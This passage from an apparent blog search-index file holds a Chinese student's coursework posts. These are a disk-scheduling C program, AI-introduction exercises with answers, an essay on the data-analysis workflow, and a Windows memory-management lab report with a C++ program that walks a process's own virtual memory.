--------------------------------------------------\\n&quot;); printf(&quot;请先输入磁道数量： \\n&quot;); scanf(&quot;%d&quot;,&amp;b); printf(&quot;请先输入磁道序列： \\n&quot;); for(i=0; i&lt;b; i++) &#123; scanf(&quot;%d&quot;,&amp;cidao[i]); &#125; printf(&quot;\\n 磁道读取结果： \\n&quot;); for(i=0; i&lt;b; i++) &#123; printf(&quot;%d &quot;,cidao[i]);//输出读取的磁道的磁道号 &#125; count=b; printf(&quot;\\n &quot;); while(1) &#123; printf(&quot;\\n 算法选择： \\n&quot;); printf(&quot; 1、先进先出算法（ FIFO） \\n&quot;); printf(&quot; 2、最短服务时间优先算法（ SSTF） \\n&quot;); printf(&quot; 3、扫描算法（ SCAN） \\n&quot;); printf(&quot; 4、循环扫描算法（ C-SCAN） \\n&quot;); printf(&quot; 5. 退出\\n&quot;); printf(&quot;\\n&quot;); printf(&quot;请选择： &quot;); scanf(&quot;%d&quot;,&amp;c); if(c&gt;5) break; switch(c)//算法选择 &#123; case 1: FIFO(cidao,count);//先进先出算法 printf(&quot;\\n&quot;); break; case 2: SSTF(cidao,count);//最短服务时间优先算法 printf(&quot;\\n&quot;); break; case 3: SCAN(cidao,count);//扫描算法 printf(&quot;\\n&quot;); break; case 4: CSCAN(cidao,count);//循环扫描算法 printf(&quot;\\n&quot;); break; case 5: exit(0); &#125; &#125; return 0;&#125;","comments":true,"categories":[{"name":"计算机基础","slug":"计算机基础","permalink":"http://1905060202.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"http://1905060202.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"},{"name":"课程设计","slug":"课程设计","permalink":"http://1905060202.github.io/tags/%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"}]},{"title":"人工智能练习题","date":"2021-06-30T14:00:34.000Z","path":"2021/06/30/人工智能练习题/","text":"人工智能导论练习题（第二版-有答案）第三章 图搜索与问题求解 设有如图所示的一棵与或树，请指出解树；并分别按和代价及最大代价求解树代价；然后指出 最优解树。 题解： 该与或树有两棵解树，其一由 S0、A、D、t1、t2、t3 组成；另一 棵由 S0、B、E、t4、t5组成。 解树 2 的和代价为 18，最大代价为 14； 解树 1 的和代价为 12，最大代价为 10。 所以，最优解树为解树 2。 试用与或树描述下面不定积分的求解过程： 题解： 图3 是五大城市间的交通示意图，边上的数字是两城市间的距离。用图搜索技术编写程序，求解 以下问题： (1)任找一条西安到北京的旅行路线，并给出其距离。 (2) 找一条从西安到北京，必须途经上海的路径。 (3) 找一条从西安到北京，必须途经上海，但不能去昆明的路径。 题解： 提示：这是一个加权状态图搜索问题，可用 分支界限法或者最近择优法求解。程序可参考 3.2.2 节例 3-11 中的通用程序，但这里open 表中每个状态节点（城市）还需要有代价（距离）项，而且从 open 表中取第一个节点前先要对 open 表中的节点按代价排序。 有一农夫带一只狼、一只羊和一筐菜欲从河的左岸乘船到右岸，但受下列条件限制： (1) 船太小，农夫每次只能带一样东西过河； (2) 如果没有农夫看管，则狼要吃羊，羊要吃菜。 设计一个过河方案， 使得农夫、狼、羊、菜都能不受损失地过河。画出相应的状态变化图。 提示： (1) 用四元组(农夫、狼、羊、菜)表示状态，其中每个元素都可为0或1，用0表示在左岸， 用1表示在右岸。 (2) 把每次过河的一种安排作为一个算符，每次过河都必须有农夫，因为只有他可以划 船。 题解： 方案一：Step1 农夫带羊过河； ​ Step2 农夫返回带菜过河 ​ Step3 农夫带羊回去，然后带狼过河； ​ Step4 农夫返回带羊过河； ​ 设 A 农夫，B 羊，C 狼，D 菜，初始状态为（A0,B0,C0,D0）（未过河），最终状态为（A1, B1, C1, D1）(已过河） 。则相应的状态变化图如下： 方案 2：Step1：农夫带羊过河； ​ Step2：农夫返回带狼过河； ​ Step3：农夫带羊返回去，然后把菜带过河； ​ Step4：农夫回去带羊过河； 则相应的状态变化图为： 设有三只琴键开关一字排开，初始状态为“关、开、关”，问连按三次后是否会出现“开、 开、开”或 “关、关、关”的状态？ 要求每次必须按下一个开关，而且只能按一个开关。 另外，画出这个琴键开关的状态空间图。 注： 琴键开关有这样的特点，若第一次按下时它为“开”，则第二次按下时它就变成了“关”。 题解： 第四章 基于遗传算法的随机优化搜索 举例说明遗传算法中的三种遗传操作。 题解： 画出基本遗传算法的流程图 题解： 第五章 基于一阶谓词的机器推理 将下列句子用一阶谓词形式表示。 (1)雪是白的。 (2)数a和数b之和大于数c。 (3) 201班的学生每人都有一台笔记本电脑。 (4)如果明天天气晴朗且我们有时间，则我们去郊游。 (5)一个三角形是等腰三角形，当且仅当其有两个角相等。 题解： 求下列谓词公式的子句集。 题解： 试判断下列子句集中哪些是不可满足的。 题解： 对下列各题分别证明，G是否可肯定是F，F1，F2，…的逻辑结论。 题解： 设已知： (1) 凡是清洁的东西就有人喜欢；(2) 人们都不喜欢苍蝇。 试用谓词公式表示这两个命题，并用归结原理证明：苍蝇是不清洁的。 题解： 某公司招聘工作人员，有A, B, C三人应聘，经面试后，公司表示如下想法： (1) 三人中至少录取一人； (2) 如果录取A而不录取B，则一定录取C； (3) 如果录取B，则一定录取C。 试用谓词公式表示这三个命题，并用归结原理求证：公司一定录取C。 题解： 张某被盗，公安局派出五个侦察员去调查。 研究案情时，侦察员A说“赵与钱中至少有一人作案”；侦察员B说“钱与孙中至少有一人作案”； 侦察员C说“孙与李中至少有一人作案”； 侦察员D说“赵与孙中至少有一人与此案无关”； 侦察员E说“钱与李中至少有一人与此案无关”。 假设这五个侦察员的话都是可信的，用谓词公式表示这五句话，并用归结原理推出谁是盗窃犯。 题解： 试画出例5-28 的（线性）归结演绎树。 题解： 第六章 基于产生式规则的机器推理试将本章给出的正向推理和反向推理算法用PROLOG语言或其他语言编程，实现一个推理机。 第七章 几种结构化知识表示及其推理 用三元组表示下列命题。 (1)雪是白的。 (2)小张身高1.80米。 题解： (1) （雪，颜色，白） (2) （小张，身高，1.80） 试写出“学生框架”的描述，并用PROLOG语言实现 题解： 请把下列命题表示的事实用一个语义网络表示出来，并用PROLOG语言实现。 (1) 树和草都是植物； (2) 树和草都是有根有叶的； (3) 水草是草，且长在水中； (4) 果树是树，且会结果； (5) 樱桃树是一种果树，它结樱桃。 题解： 第八章 不确定和不确切性知识的表示与推理 举一个不确定性产生式规则实例，并用附有信度的规则形式表示，进而PROLOG语言表示。 题解： 举一个不确切性产生式规则实例，并用程度化规则形式表示，进而PROLOG语言表示。 题解: 写一个程度化框架和一个程度化语义网络，并用PROLOG语言表示。 题解： 试写出天气“热”、“温和”、“冷”这三个软语言值的相容函数。 题解： 设有如下一组规则： r1: If E1Then E2(0.6) r2: If E2 and E3 Then E4(0.8) r3: If E4 Then H(0.7) r4: If E5 Then H(0.9) 且已知 CF(E1)＝0.5，CF(E3)＝0.6，CF(E5)＝0.4 用确定性理论求CF(H)。 题解： 写出例8-11中软语言值“低”和“高”的相容函数。 题解： 第九章 机器学习：符号学习与交互学习 通过计算条件熵，完成9.3.3节例子中根节点以下节点的选择，并验证原所得决策树是否最简。 题解： 完成9.4.2节中图9-19中其余动作Q’值的更新，并给出一个最优策略*。 题解： 在此感谢老王的辛勤付出，为我们摘录了题目！©老王","comments":true,"categories":[{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/categories/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}],"tags":[{"name":"学习","slug":"学习","permalink":"http://1905060202.github.io/tags/%E5%AD%A6%E4%B9%A0/"},{"name":"人工智能","slug":"人工智能","permalink":"http://1905060202.github.io/tags/%E4%BA%BA%E5%B7%A5%E6%99%BA%E8%83%BD/"}]},{"title":"站在数据分析师的角度谈谈对数据的处理方法","date":"2021-06-30T13:49:05.000Z","path":"2021/06/30/站在数据分析师的角度谈谈对数据处理的方法/","text":"淘宝卖家数据显示： 胸最大的是新疆妹子，国内内衣消费最多的SIZE是B； 其中75B销量最好，占比41.45%，其次是A，占比 25.26%； 各种颜色中，黑色最为畅销，因为百搭。 ………… 这些早已应用在内衣生产、备货、销售等关键环节。 网易云音乐数据显示： 90后用户占比高达59%，其次是80后（12%）； 除了流行歌曲，用户最喜欢的风格竟是电音，其中又以广东用户对电音最为热爱； 最青睐民谣的省份是：甘肃&amp;陕西，最喜欢舞曲的是新疆朋友； 小众音乐主要聚集在北上广深； ………… 这些数据也服务于网易云音乐的个性化推荐系统 但数据分析的应用还远不止如此，利用数据分析的方法，我们还可以得到很多有意思的结论。 比如谷歌的数据分析可以预测一个地区即将爆发的流感，从而进行针对性的预防；淘宝可以根据你浏览和消费的数据进行分析，为你精准推荐商品；口碑极好的网易云音乐，通过其相似性算法，为不同的人量身定制每日歌单…… 数据正在变得越来越常见，而数据分析的价值也越来越凸显。在大型互联网企业（比如谷歌、阿里、腾讯、等）每天将产生海量的数据；就算是初创的互联网公司，日志、用户、运营等数据量也不可小觑；而一大波传统企业，在普及智能终端的情况下，所产生的数据，也非同小可。那么一个比较完善的数据分析流程是什么样的呢？ 1.问题定义比较典型的场景是我们需要针对企业的数据进行分析，比如公司通常会有销售数据、用户数据、运营数据、产品生产数据……你需要从这些数据里获得哪些有用的信息，对策略的制定进行指导呢？又比如你需要做的是一份市场调研或者行业分析，那么你需要知道你需要获得关于这个行业的哪些信息。 首先你需要确定去分析的问题是什么？你想得出哪些结论？ 比如某地区空气质量变化的趋势是什么？ 王者荣耀玩家的用户画像是什么样的？经常消费的是那类人？ 影响公司销售额增长的关键因素是什么？ 生产环节中影响产能和质量的核心指标是什么？ 如何对分析用户画像并进行精准营销？ 如何基于历史数据预测未来某个阶段用户行为？ ………… 这些问题可能来源于你已有的经验和知识。比如你已经知道每周的不同时间用户购买量不一样，那么你可以通过分析得出销量和时间的精确关系，从而精准备货。又比如你知道北京最近几年的空气质量是在变坏的，可能的因素是工厂排放、沙尘暴、居民排放、天气因素等，那么在定义问题的时候你就需要想清楚，需要针对哪些因素进行重点分析。 有些问题则并不清晰，比如在生产环节中，影响质量的核心指标是什么，是原材料？设备水平？工人水平？天气情况？某个环节工艺的复杂度？某项操作的重复次数？……这些可能并不明显，或者你是涉足新的领域，并没有非常专业的知识，那么你可能需要定义的问题就需要更加宽泛，涵盖更多的可能性。 问题的定义可能需要你去了解业务的核心知识，并从中获得一些可以帮助你进行分析的经验。从某种程度上说，这也是我们经常提到的数据思维。数据分析很多时候可以帮助你发现我们不容易发现的相关性，但对问题的精确定义，可以从很大程度上提升数据分析的效率。 如何更好地定义问题？ 这就需要你在长期的训练中找到对数据的感觉，开始的时候你拿到特别大的数据，有非常多的字段，可能会很懵逼，到底应该从什么地方下手呢？ 但如果有一些经验就会好很多。比如，你要研究影响跑步运动员速度的身体因素，那么我们可能会去研究运动员的身高、腿长、体重、甚至心率、血压、臂长，而不太会去研究运动员的腋毛长度，这是基于我们已有的知识。又比如我们要分析影响一个地方房价的因素，那么我们可能会有一些通用的常识，比如城市人口、地理位置、GDP、地价、物价水平，更深入的可能会有产业格局、文化状态、气候情况等等，但一般我们不会去研究城市的女孩长相，美女占比。 所以当你分析的问题多了之后，你就会有一些自己对数据的敏感度，从而养成用数据分析、用数据说话的习惯。这个时候你甚至可以基于一些数据，根据自己的经验做出初步的判断和预测（当然是不能取代完整样本的精准预测），这个时候，你就基本拥有数据思维了。 2.数据获取有了具体的问题，你就需要获取相关的数据了。比如你要探究北京空气质量变化的趋势，你可能就需要收集北京最近几年的空气质量数据、天气数据，甚至工厂数据、气体排放数据、重要日程数据等等。如果你要分析影响公司销售的关键因素，你就需要调用公司的历史销售数据、用户画像数据、广告投放数据等。 数据的获取方式有多种。 一是公司的销售、用户数据，可以直接从企业数据库调取，所以你需要SQL技能去完成数据提取等的数据库管理工作。比如你可以根据你的需要提取2017年所有的销售数据、提取今年销量最大的50件商品的数据、提取上海、广东地区用户的消费数据……，SQL可以通过简单的命令帮你完成这些工作。 第二种是获取外部的公开数据集，一些科研机构、企业、政府会开放一些数据，你需要到特定的网站去下载这些数据。这些数据集通常比较完善、质量相对较高。当然这种方式也有一些缺陷，通常数据会发布的比较滞后，但通常因为客观性、权威性，仍然具有很大的价值。 第三种是编写网页爬虫，去收集互联网上的数据。比如你可以通过爬虫获取招聘网站某一职位的招聘信息，爬取租房网站上某城市的租房信息，爬取豆瓣评分评分最高的电影列表，获取知乎点赞排行、网易云音乐评论排行列表。基于互联网爬取的数据，你可以对某个行业、某种人群进行分析，这算是非常靠谱的市场调研、竞品分析的方式了。 当然，比较BUG的一点是，你通常并不能够获得所有你需要的数据，这对你的分析结果是有一定影响的，但不不影响的是，你通过有限的可获取的数据，提取更多有用的信息。 3.数据预处理现实世界中数据大体上都是不完整，不一致的脏数据，无法直接进行数据分析，或分析结果差强人意。数据预处理有多种方法：数据清理，数据集成，数据变换，数据归约等。把这些影响分析的数据处理好，才能获得更加精确地分析结果。 比如空气质量的数据，其中有很多天的数据由于设备的原因是没有监测到的，有一些数据是记录重复的，还有一些数据是设备故障时监测无效的。 那么我们需要用相应的方法去处理，比如残缺数据，我们是直接去掉这条数据，还是用临近的值去补全，这些都是需要考虑的问题。 当然在这里我们还可能会有数据的分组、基本描述统计量的计算、基本统计图形的绘制、数据取值的转换、数据的正态化处理等，能够帮助我们掌握数据的分布特征，是进一步深入分析和建模的基础。 4.数据分析与建模在这个部分需要了解基本的数据分析方法、数据挖掘算法，了解不同方法适用的场景和适合的问题。分析时应切忌滥用和误用统计分析方法。滥用和误用统计分析方法主要是由于对方法能解决哪类问题、方法适用的前提、方法对数据的要求不清等原因造成的。 另外，选择几种统计分析方法对数据进行探索性的反复分析也是极为重要的。每一种统计分析方法都有自己的特点和局限，因此，一般需要选择几种方法反复印证分析，仅依据一种分析方法的结果就断然下结论是不科学的。 比如你发现在一定条件下，销量和价格是正比关系，那么你可以据此建立一个线性回归模型，你发现价格和广告是非线性关系，你可以先建立一个逻辑回归模型来进行分析。 一般情况下，回归分析的方法可以满足很大一部分的分析需求，当然你也可以了解一些数据挖掘的算法、特征提取的方法来优化自己的模型，获得更好地结果。 5.数据可视化及数据报告的撰写分析结果最直接的结果是统计量的描述和统计量的展示。 比如我们通过数据的分布发现数据分析工资最高的5个城市，目前各种语言的流行度排行榜，近几年北京空气质量的变化趋势，避孕套消费的地区分布……这些都是我们通过简单数据分析与可视化就可以展现出的结果。 另外一些则需要深入探究内部的关系，比如影响产品质量最关键的几个指标，你需要对不同指标与产品质量进行相关性分析之后才能得出正确结论。又比如你需要预测未来某个时间段的产品销量，则需要你对历史数据进行建模和分析，才能对未来的情况有更精准的预测。 数据分析报告不仅是分析结果的直接呈现，还是对相关情况的一个全面的认识。我们经常看到一些行业分析报告从不同角度、深入浅析地剖析各种关系。所以你需要一个讲故事的逻辑，如何从一个宏观的问题，深入、细化到问题内部的方方面面，得出令人信服的结果，这需要从实践中不断训练。 数据分析的一般流程总的来说就是这几个步骤：问题定义、数据获取、数据预处理、数据分析与建模、数据可视化与数据报告的撰写。","comments":true,"categories":[{"name":"数据分析","slug":"数据分析","permalink":"http://1905060202.github.io/categories/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"}],"tags":[{"name":"python","slug":"python","permalink":"http://1905060202.github.io/tags/python/"},{"name":"期末复习","slug":"期末复习","permalink":"http://1905060202.github.io/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"}]},{"title":"操作系统课程设计(五)-内存管理","date":"2021-06-22T09:12:42.000Z","path":"2021/06/22/操作系统课程设计-五-内存管理/","text":"写在前面又到了 一年一度期末课设的时候，距离考试还有12天的时间，此时胡小宁还没有复习(准确的说是学习)之前的课程，所以在这个平平无奇的周二，胡小宁就要开始做课设了！ 实验目的（1） 通过对 Windows xp/7“任务管理器”、“计算机管理”、“我的电脑”属性、“系统信息”、“系统监视器”等程序的应用，学习如何察看和调整 Windows 的内存性能，加深对操作系统内存管理、虚拟存储管理等理论知识的理解。 （2） 了解 Windows xp/7 的内存结构和虚拟内存的管理，理解进程的虚拟内存空间和物理内存的映射关系。 总体设计背景知识耗尽内存是 Windows 系统中最常见的问题之一。当系统耗尽内存时，所有进程对内存的总需求超出了系统的物理内存总量。随后，Windows 必须借助它的虚拟内存来维持系统和进程的运行。虚拟内存机制是 Windows 操作系统的重要组成部分，但它的速度比物理内存慢得多，因此，应该尽量避免耗尽物理内存资源，以免导致性能下降。解决内存不足问题的一个有效的方法就是添加更多的内存。但是，一旦提供了更多的内存，Windows 很可以会立即“吞食”。而事实上，添加更多的内存并非总是可行的，也可能只是推迟了实际问题的发生。因此，应该相信，优化所拥有的内存是非常关键的。 （1） 分页过程 当 Windows 求助于硬盘以获得虚拟内存时，这个过程被称为分页 (paging) 。分页就是将信息从主内存移动到磁盘进行临时存储的过程。当进程需要已经交换到硬盘上的代码或数据时，系统要将数据送回物理内存，并在必要时将其他信息传输到硬盘上，而硬盘与物理内存在性能上的差异极大。例如，硬盘的访问时间通常大约为 4-10 毫秒，而物理内存的访问时间为 60us，甚至更快。 （2） 内存共享 应用程序经常需要彼此通信和共享信息。为了提供这种能力，Windows 必须允许访问某些内存空间而不危及它和其他应用程序的安全性和完整性。从性能的角度来看，共享内存的能力大大减少了应用程序使用的内存数量。 （3） 未分页合并内存与分页合并内存 Windows 决定了系统内存组件哪些可以以及哪些不可以交换到磁盘上。显然，不应该将某些代码 (例如内核) 交换出主内存。因此，Windows 将系统使用的内存进一步划分为未分页合并内存和分页合并内存。分页合并内存是存储迟早需要的可分页代码或数据的内存部分。虽然可以将分页合并内存中的任何系统进程交换到磁盘上，但是它临时存储在主内存的这一部分，以防系统立刻需要它。在将系统进程交换到磁盘上之前，Windows 会交换其他进程。 未分页合并内存包含必须驻留在内存中的占用代码或数据。这种结构类似于早期的 MS-DOS 程序使用的结构，在 MS-DOS 中，相对较小的终止并驻留程序 (Terminate and Stay Resident，TSR) 在启动时加载到内存中。这些程序在系统重新启动或关闭之前一直驻留在内存的特定部分中。 （4）分页文件最重要的配置参数是大小。无论系统中有多少个分页文件，如果它们的大小不合适，那么系统就可能遇到性能问题。 如果初始值太小，那么系统可能必须扩大分页文件，以补偿额外的分页活动。当系统临时增加分页文件时，它必须在处理分页请求的同时创建新的空间。这时，系统将出现大量的页面错误，甚至可能出现系统失效。当系统必须在进程的工作区外部 (在物理内存或分页文件中的其他位置) 查找信息时，就会出现页面错误。当系统缺乏存储资源 (物理内存及虚拟内存) 来满足使用需求，从而遇到过多的分页时，就会出现系统失效。系统将花更多的时间来分页而不是执行应用程序。当系统失效时，Memory：Pages/see 计数器将持续高于每秒 100 页。系统失效严重降低了系统的性能。此外，动态扩展分页文件将导致碎片化。分页文件将散布在整个磁盘上而不是在启动时的连续空间中创建，从而增加了系统的开销，并导致系统性能降低。因此，应该尽量避免系统增加分页文件的大小。 设计步骤（1）观察和调整 Windows XP/7 的内存性能。 步骤 1：阅读“背景知识”，请回答： 什么是“分页过程”？ 什么是“内存共享”？ 什么是“未分页合并内存”和“分页合并内存”？ Windows xp 中，未分页合并内存的最大限制是多少？ Windows xp 分页文件默认设置的最小容量和最大容量是多少？ 步骤 2：登录进入 Windows xp。 步骤 3：查看包含多个实例的应用程序的内存需求。 启动想要监视的应用程序，例如 Word。 右键单击任务栏以启动“任务管理器”。 在“Windows 任务管理器”对话框中选定“进程”选项卡。 向下滚动在系统上运行的进程列表，查找想要监视的应用程序。 请在表5-1中记录： “内存使用”列显示了该应用程序的一个实例正在使用的内存数量。 启动应用程序的另一个实例并观察它的内存需求。 请描述使用第二个实例占用的内存与使用第一个实例时的内存对比情况。 步骤 4：未分页合并内存。 估算未分页合并内存大小的最简单方法是使用“任务管理器”。未分页合并内存的估计值显示在“任务管理器”的“性能”选项卡的“核心内存”部分。见5.4 还可以使用“任务管理器”查看一个独立进程正在使用的未分页合并内存数量和分页合并内存数量。操作步骤如下： 单击“Windows 任务管理器”的“进程”选项卡，然后从“查看”菜单中选择“选择列”命令，显示“进程”选项卡的可查看选项。 在“选择列”对话框中，选定“页面缓冲池”选项和“非页面缓冲池”选项旁边的复选框，然后单击“确定”按钮。 返回 Windows Xp“任务管理器”的“进程”选项卡时，将看到其中增加显示了各个进程占用的分页合并内存数量和未分页合并内存数量。 仍以刚才打开观察的应用程序 (例如 Word) 为例，请在表5-2中记录： 从性能的角度来看，未分页合并内存越多，可以加载到这个空间的数据就越多。拥有的物理内存越多，未分页合并内存就越多。但未分页合并内存被限制为 256MB，因此添加超出这个限制的内存对未分页合并内存没有影响。 步骤 5：提高分页性能。 在 Windows xp 的安装过程中，将使用连续的磁盘空间自动创建分页文件(pagefile.sys) 。用户可以事先监视变化的内存需求并正确配置分页文件，使得当系统必须借助于分页时的性能达到最高。 虽然分页文件一般都放在系统分区的根目录下面，但这并不总是该文件的最佳位置。要想从分页获得最佳性能，应该首先检查系统的磁盘子系统的配置，以了解它是否有多个物理硬盘驱动器。 在“开始”菜单中单击“设置” – “控制面板”命令，双击“管理工具”图标，再双击“计算机管理”图标。 在“计算机管理”窗口的左格选择“磁盘管理”管理单元来查看系统的磁盘配置。 请在表5-3中记录： 如果系统只有一个硬盘，那么建议应该尽可能为系统配置额外的驱动器。这是因为：Windows xp 最多可以支持在多个驱动器上分布的 16 个独立的分页文件。为系统配置多个分页文件可以实现对不同磁盘 I/O 请求的并行处理，这将大大提高 I/O 请求的分页文件性能。 步骤 6：计算分页文件的大小。 要想更改分页文件的位置或大小配置参数，可按以下步骤进行： 右键单击桌面上的“我的电脑” （Win7 为计算机）图标并选定“属性” （Win7 为高级系统设置） 。 在“高级”选项卡上单击“性能选项”按钮。 单击对话框中的“虚拟内存”区域中的“更改”按钮。 请记录：见5.4 要想将另一个分页文件添加到现有配置，在“虚拟内存”对话框中选定一个还没有分页文件的驱动器，然后指定分页文件的初始值和最大值 (以兆字节表示) ，单击“设置”，然后单击“确定”。 要想更改现有分页文件的最大值和最小值，可选定分页文件所在的驱动器。然后指定分页文件的初始值和最大值，单击“设置”按钮，然后单击“确定”按钮。 在“性能选项”对话框中单击“确定”按钮。 单击“确定”按钮以关闭“系统特性”对话框。 （2）了解和检测进程的虚拟内存空间。 步骤 1：创建一个“Win32 Consol Application”工程，然后拷贝清单 5-1 中的程序，编译成 可执行文件。 步骤 2：在 VC 的工具栏单击“Execute Program”(执行程序) 按钮，或者按 Ctrl + F5 键，或者在“命令提示符”窗口运行步骤 1 中生成的可执行文件。 步骤 3：根据运行结果，回答下列问题。见5.4 按 committed、reserved、free 等三种虚拟地址空间分别记录实验数据。其中“描述”是指对该组数据的简单描述，例如，对下列一组数据： 00010000 – 00012000 &lt;8.00KB&gt; Committed, READWRITE, Private 可描述为：具有 READWRITE 权限的已调配私有内存区。 将系统当前的自由区 (free) 虚拟地址空间按表5-4格式记录。 将系统当前的已调配区 (committed) 虚拟地址空间按表5-5格式记录。 将系统当前的保留区 (reserved) 虚拟地址空间按表5-6格式记录。 详细设计（1）了解和检测进程的虚拟内存空间 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114// 工程 vmwalker#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &lt;shlwapi.h&gt;#include &lt;iomanip&gt;#pragma comment(lib, &quot;Shlwapi.lib&quot;)// 以可读方式对用户显示保护的辅助方法。// 保护标记表示允许应用程序对内存进行访问的类型// 以及操作系统强制访问的类型inline bool TestSet(DWORD dwTarget, DWORD dwMask)&#123; return ((dwTarget &amp;dwMask) == dwMask) ;&#125;# define SHOWMASK(dwTarget, type) \\if (TestSet(dwTarget, PAGE_##type) ) \\&#123;std :: cout &lt;&lt; &quot;, &quot; &lt;&lt; #type; &#125;void ShowProtection(DWORD dwTarget)&#123; SHOWMASK(dwTarget, READONLY) ; SHOWMASK(dwTarget, GUARD) ; SHOWMASK(dwTarget, NOCACHE) ; SHOWMASK(dwTarget, READWRITE) ; SHOWMASK(dwTarget, WRITECOPY) ; SHOWMASK(dwTarget, EXECUTE) ; SHOWMASK(dwTarget, EXECUTE_READ) ; SHOWMASK(dwTarget, EXECUTE_READWRITE) ; SHOWMASK(dwTarget, EXECUTE_WRITECOPY) ; SHOWMASK(dwTarget, NOACCESS) ;&#125;// 遍历整个虚拟内存并对用户显示其属性的工作程序的方法void WalkVM(HANDLE hProcess)&#123;// 首先，获得系统信息 SYSTEM_INFO si; :: ZeroMemory(&amp;si, sizeof(si) ) ; :: GetSystemInfo(&amp;si) ;// 分配要存放信息的缓冲区 MEMORY_BASIC_INFORMATION mbi; :: ZeroMemory(&amp;mbi, sizeof(mbi) ) ;// 循环整个应用程序地址空间 LPCVOID pBlock = (LPVOID) si.lpMinimumApplicationAddress; while (pBlock &lt; si.lpMaximumApplicationAddress) &#123;// 获得下一个虚拟内存块的信息 if (:: VirtualQueryEx( hProcess, // 相关的进程 pBlock, // 开始位置 &amp;mbi, // 缓冲区 sizeof(mbi))==sizeof(mbi) ) // 大小的确认 &#123;// 计算块的结尾及其大小 LPCVOID pEnd = (PBYTE) pBlock + mbi.RegionSize; TCHAR szSize[MAX_PATH]; :: StrFormatByteSize(mbi.RegionSize, szSize, MAX_PATH) ; std :: cout.fill (&#x27;0&#x27;) ; std :: cout&lt;&lt; std :: hex &lt;&lt; std :: setw(8) &lt;&lt; (DWORD) pBlock &lt;&lt; &quot;-&quot; &lt;&lt; std :: hex &lt;&lt; std :: setw(8) &lt;&lt; (DWORD) pEnd &lt;&lt; (:: strlen(szSize)==7? &quot; (&quot; : &quot; (&quot;) &lt;&lt; szSize&lt;&lt; &quot;) &quot; ; switch(mbi.State) &#123; case MEM_COMMIT : std :: cout &lt;&lt; &quot;Committed&quot; ; break; case MEM_FREE : std :: cout &lt;&lt; &quot;Free&quot; ; break; case MEM_RESERVE : std :: cout &lt;&lt; &quot;Reserved&quot; ; break; &#125; if(mbi.Protect==0 &amp;&amp; mbi.State!=MEM_FREE) &#123; mbi.Protect=PAGE_READONLY; &#125; ShowProtection(mbi.Protect); switch(mbi.Type) &#123; case MEM_IMAGE : std :: cout &lt;&lt; &quot;, Image&quot; ; break; case MEM_MAPPED: std :: cout &lt;&lt; &quot;, Mapped&quot;; break; case MEM_PRIVATE : std :: cout &lt;&lt; &quot;, Private&quot; ; break;&#125;// 检验可执行的影像 TCHAR szFilename [MAX_PATH] ; if (:: GetModuleFileName ( (HMODULE) pBlock, // 实际虚拟内存的模块句柄 szFilename, //完全指定的文件名称 MAX_PATH)&gt;0) //实际使用的缓冲区大小 &#123;// 除去路径并显示 :: PathStripPath(szFilename) ; std :: cout &lt;&lt; &quot;, Module: &quot; &lt;&lt; szFilename; &#125; std :: cout &lt;&lt; std :: endl;// 移动块指针以获得下一下个块 pBlock = pEnd; &#125; &#125; &#125;void ShowVirtualMemory()&#123;// 首先，让我们获得系统信息 SYSTEM_INFO si; :: ZeroMemory(&amp;si, sizeof(si) ) ; :: GetSystemInfo(&amp;si) ;// 使用外壳辅助程序对一些尺寸进行格式化 TCHAR szPageSize[MAX_PATH]; ::StrFormatByteSize(si.dwPageSize, szPageSize, MAX_PATH) ; 26 DWORD dwMemSize = (DWORD)si.lpMaximumApplicationAddress -(DWORD) si.lpMinimumApplicationAddress; TCHAR szMemSize [MAX_PATH] ; :: StrFormatByteSize(dwMemSize, szMemSize, MAX_PATH) ;// 将内存信息显示出来 std :: cout &lt;&lt; &quot;Virtual memory page size: &quot; &lt;&lt; szPageSize &lt;&lt; std :: endl; std :: cout.fill (&#x27;0&#x27;) ; std :: cout &lt;&lt; &quot;Minimum application address: 0x&quot;&lt;&lt; std :: hex &lt;&lt; std :: setw(8) &lt;&lt; (DWORD) si.lpMinimumApplicationAddress&lt;&lt; std :: endl; std :: cout &lt;&lt; &quot;Maximum application address: 0x&quot;&lt;&lt; std :: hex &lt;&lt; std :: setw(8) &lt;&lt; (DWORD) si.lpMaximumApplicationAddress&lt;&lt; std :: endl; std :: cout &lt;&lt; &quot;Total available virtual memory: &quot;&lt;&lt; szMemSize &lt;&lt; std :: endl ; &#125;void main()&#123;//显示虚拟内存的基本信息 ShowVirtualMemory();// 遍历当前进程的虚拟内存 ::WalkVM(::GetCurrentProcess()); &#125; 5.4实验结果和分析（1）观察和调整 Windows XP/7 的内存性能。 步骤1**：** 分页过程：当 Windows 求助于硬盘以获得虚拟内存时，这个过程被称为分页。分页就是将信息从主内存移动到磁盘进行临时存储的过程。 内存共享：应用程序需要彼此通信和共享信息。 未分页合并内存：包含必须驻留在内存中的占用代码或数据。 分页合并内存：存储迟早需要的可分页代码或数据的内存部分。 Windows xp 中，未分页合并内存的最大限制是：256MB (在 Windows NT 4 中的限制为 128MB) 4） Windows xp 使用内存容量的1.5倍作为分页文件的最小容量，这个最小容量的两倍作为最大容量。 ​ 步骤3**：** 表5-1 应用内存需求实验记录 映像名称 PID CPU 时间 内存使用 Chrome 11704 00 0:01:07 10,844k ​ 步骤4**：** ​ 总数 ：248MB 分页数：179MB 未分页 ：69MB 表5-2 应用内存使用实验记录 映像名称 PID 内存使用 页面缓冲池 非页面缓冲池 Chrome 11704 00 399k 10k ​ 步骤5**：** 表5-3 磁盘配置实验记录 卷 布局 类型 文件系统 容量 状态 （C：） 简单 基本 NTFS 80.00GB 状态良好（系统，启动，页面文件，活动，故障转储，主分区） （D：） 简单 基本 NTFS 15.00GB 良好（逻辑驱动器） （E：） 简单 基本 NTFS 15.00GB 良好（逻辑驱动器） （F：） 简单 基本 FAT32 49.99GB 良好（逻辑驱动器） 所选驱动器的页面文件大小： 1_驱动器：C: 可用空间：55653MB 初始大小(MB)：无 最大值(MB)：无 2_驱动器：D: 可用空间：14611MB 